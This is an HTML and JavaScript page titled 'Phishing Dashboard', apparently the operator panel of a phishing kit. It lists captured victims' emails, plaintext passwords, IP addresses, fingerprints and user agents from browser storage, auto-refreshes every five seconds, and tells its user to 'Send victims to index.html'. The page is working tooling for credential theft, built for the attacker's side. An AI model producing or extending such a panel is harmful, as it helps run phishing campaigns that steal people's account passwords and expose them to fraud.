<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Phishing Dashboard</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { font-family: 'Segoe UI',Tahoma,Geneva,Verdana,sans-serif; background:#1e1e1e; color:#fff; padding:20px; }
        .container { max-width:1200px; margin:0 auto; }
        h1 { color:#00ff88; margin-bottom:20px; text-align:center; }
        .stats { display:grid; grid-template-columns:repeat(auto-fit,minmax(200px,1fr)); gap:20px; margin-bottom:30px; }
        .stat-card { background:linear-gradient(135deg,#667eea 0%,#764ba2 100%); padding:20px; border-radius:12px; text-align:center; }
        .stat-number { font-size:2.5em; font-weight:bold; color:#00ff88; display:block; }
        .stat-label { color:#ccc; font-size:0.9em; }
        table { width:100%; background:#2d2d2d; border-radius:12px; overflow:hidden; box-shadow:0 10px 30px rgba(0,0,0,0.5); }
        th, td { padding:15px; text-align:left; border-bottom:1px solid #404040; }
        th { background:#3d3d3d; font-weight:600; color:#00ff88; }
        tr:hover { background:#363636; }
        .email { font-weight:bold; color:#4fc3f7; }
        .password { font-family:monospace; color:#ff6b6b; letter-spacing:1px; }
        .timestamp { color:#ccc; font-size:0.9em; }
        .fingerprint { font-family:monospace; font-size:0.8em; color:#888; }
        .refresh { position:fixed; top:20px; right:20px; background:#00ff88; color:#000; border:none; padding:10px 20px; border-radius:25px; cursor:pointer; font-weight:bold; }
        .empty { text-align:center; padding:50px; color:#888; font-style:italic; }
        @media (max-width:768px) { body { padding:10px; } table { font-size:0.9em; } th, td { padding:10px 5px; } }
    </style>
</head>
<body>
    <button class="refresh" onclick="location.reload()">🔄 Refresh</button>
    <div class="container">
        <h1>🎣 Phishing Dashboard</h1>
        <div class="stats" id="stats"></div>
        <table id="capturesTable">
            <thead>
                <tr>
                    <th>Email</th>
                    <th>Password</th>
                    <th>IP</th>
                    <th>Time</th>
                    <th>Fingerprint</th>
                    <th>User Agent</th>
                </tr>
            </thead>
            <tbody id="tableBody"></tbody>
        </table>
    </div>

    <script>
        function loadCaptures() {
            const captures = JSON.parse(localStorage.getItem('phishCaptures') || '[]');
            
            // Update stats
            document.getElementById('stats').innerHTML = `
                <div class="stat-card">
                    <span class="stat-number">${captures.length}</span>
                    <span class="stat-label">Total Captures</span>
                </div>
                <div class="stat-card">
                    <span class="stat-number">${new Set(captures.map(c => c.email)).size}</span>
                    <span class="stat-label">Unique Emails</span>
                </div>
                <div class="stat-card">
                    <span class="stat-number">${Math.max(...captures.map(c => new Date(c.timestamp).getTime())) ? new Date().getMinutes() - new Date(Math.max(...captures.map(c => new Date(c.timestamp).getTime()))).getMinutes() : 0} min</span>
                    <span class="stat-label">Latest Capture</span>
                </div>
            `;
            
            // Populate table
            const tbody = document.getElementById('tableBody');
            tbody.innerHTML = captures.length ? 
                captures.map(capture => `
                    <tr>
                        <td class="email">${capture.email}</td>
                        <td class="password">${capture.password}</td>
                        <td>${capture.ip || 'Detecting...'}</td>
                        <td class="timestamp">${new Date(capture.timestamp).toLocaleString()}</td>
                        <td class="fingerprint">${capture.fingerprint.slice(0,30)}...</td>
                        <td style="font-size:0.8em;">${capture.userAgent.slice(0,50)}...</td>
                    </tr>
                `).join('') : '<tr><td colspan="6" class="empty">No captures yet. Send victims to index.html</td></tr>';
        }

        // Auto-refresh every 5s
        setInterval(loadCaptures, 5000);
        loadCaptures();
    </script>
</body>
</html>
